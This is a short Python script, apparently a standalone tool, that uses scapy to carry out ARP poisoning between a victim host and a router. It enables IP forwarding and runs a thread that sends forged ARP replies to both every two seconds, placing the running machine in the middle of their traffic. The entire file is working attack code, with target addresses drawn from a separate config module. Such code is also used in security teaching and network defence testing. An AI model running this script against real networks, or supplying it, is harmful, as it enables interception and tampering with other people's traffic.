#!/usr/bin/python

from threading import *
from scapy.all import *
from config import *
import sys
import signal
import time

# Sets packet forwarding
with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
    ipf.write('1\n')

# Sends the ARP poisoning packets
def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC),verbose=0)
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC),verbose=0)

# Constructs the ARP spoofing Thread
class arpSpoofThread (Thread):
    def __init__(self, threadID, name, delay):
        Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.delay = delay
    
    def run(self):
	    while 1:
        	poison(host_info["routerIP"], host_info["victimIP"], host_info["routerMAC"], host_info["victimMAC"])
        	time.sleep(2)

def main():
    
    # Creates and starts the Threads
    t1 = arpSpoofThread(1, 'arp_spoofing', 0)   #create thread
    t1.start()
    t1.join()
       
if __name__ == '__main__':
      main()

